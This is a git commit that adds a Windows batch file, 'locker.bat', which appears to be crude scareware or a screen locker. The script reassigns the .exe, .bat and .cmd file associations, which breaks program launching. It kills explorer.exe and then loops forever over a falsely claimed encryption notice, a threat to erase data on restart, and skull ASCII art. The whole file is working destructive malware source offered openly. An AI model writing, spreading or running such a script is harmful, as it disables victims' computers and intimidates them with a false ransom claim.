8e7e48576ba3bb5fbdf50b450b898f2768814a02
DarkAngel012 <108189271+DarkAngel012@users.noreply.github.com>
2022-08-20 12:32:04 +0200

    Add files via upload

---
+++ locker.bat
@@ -0,0 +1,48 @@
+@echo off
+
+
+@color C
+assoc .exe=.mp3
+assoc .bat=.lnk
+assoc .cmd=.png
+taskkill /f /im explorer.exe
+:A
+cls
+echo Ooops All your data has been crypted by Dark Angel
+echo Its a locker for Windows Im fucked your PC
+echo.
+echo.
+echo WARNING!  if you try to restart your PC or close this window, all data will be erased without the possibility of recovery
+echo.
+echo _________.e$$$$e._________
+echo _______e$$$$$$$$$$e_______
+echo ______$$$$$$$$$$$$$$______
+echo _____d$$$$$$$$$$$$$$b_____
+echo _____$$$$$$$$$$$$$$$$_____
+echo ____4$$$$$$$$$$$$$$$$F____
+echo ____4$$$$$$$$$$$$$$$$F____
+echo ____$$$$"_"$$$$"_"$$$$_____
+echo _____$$F___4$$F___4$$_____
+echo _____'$F___4$$F___4$"_____
+echo ______$$___$$$$___$P______
+echo ______4$$$$$"^$$$$$%_____
+echo _______$$$$F__4$$$$_______
+echo ________"$$$ee$$$"________
+echo ________._*$$$$F4_________
+echo _________$_____.$_________
+echo _________"$$$$$$"_________
+echo __________^$$$$___________
+echo _4$$c_______""_______.$$r_
+echo _^$$$b______________e$$$"_
+echo _d$$$$$e__________z$$$$$b_
+echo 4$$$*$$$$$c____.$$$$$*$$$r
+echo _""____^*$$$be$$$*"____^"_
+echo __________"$$$$"__________
+echo ________.d$$P$$$b_________
+echo _______d$$P___^$$$b_______
+echo ___.ed$$$"______"$$$be.___
+echo _$$$$$$P__________*$$$$$$_
+echo 4$$$$$P____________$$$$$$"
+echo _"*$$$"____________^$$P__
+goto A
+Pause
